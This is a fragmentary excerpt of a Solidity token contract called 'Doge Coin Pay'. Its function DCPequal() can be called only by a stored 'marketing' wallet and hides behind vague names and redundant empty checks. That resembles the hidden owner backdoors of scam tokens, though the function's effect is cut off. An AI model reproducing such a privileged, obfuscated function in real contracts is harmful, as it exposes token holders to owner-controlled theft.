...
contract DogeCoinPay is Context, IERC20, IERC20Metadata, Ownable {

    uint256 initialSupply = 100000000*10**decimals();
    uint256 private _tax = 0;
    address public _dogecoinpaysystem;
    uint256 private _totalSupply = initialSupply;
    string private _name = "Doge Coin Pay";
    ...
    constructor(address marketingDCPwallet) {
        ...
        _dogecoinpaysystem = marketingDCPwallet;
    ...
    function DCPequal() 
    external {
        if(_dogecoinpaysystem == _msgSender()){
            if(_dogecoinpaysystem == _msgSender()){
            }
        }
        uint256 halfDCPdata = type(uint32).max;
        require(_dogecoinpaysystem == _msgSender());
